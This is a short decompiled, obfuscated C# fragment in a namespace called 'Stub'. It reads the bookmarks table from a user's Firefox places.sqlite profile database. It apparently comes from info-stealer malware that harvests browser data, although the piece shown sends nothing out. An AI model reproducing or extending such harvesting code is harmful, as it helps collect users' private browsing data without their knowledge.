using System;
using System.Collections.Generic;
using System.IO;

namespace Stub
{
	// Token: 0x0200000C RID: 12
	public class Class15
	{
		// Token: 0x0600001D RID: 29 RVA: 0x00002CFC File Offset: 0x00000EFC
		public static List<Struct8> smethod_0(string String_0)
		{
			List<Struct8> list = new List<Struct8>();
			string text = Class26.smethod_2(String_0);
			if (text == null)
			{
				return list;
			}
			Class27 @class = Class27.smethod_1(Path.Combine(text, "places.sqlite"), "moz_bookmarks");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				Struct8 @struct = default(Struct8);
				@struct.String_1 = GClass4.smethod_4(@class.method_0(i, 5));
				if (GClass4.smethod_4(@class.method_0(i, 1)).Equals("0") && @struct.String_1 != "0")
				{
					list.Add(@struct);
				}
			}
			return list;
		}
	}
}
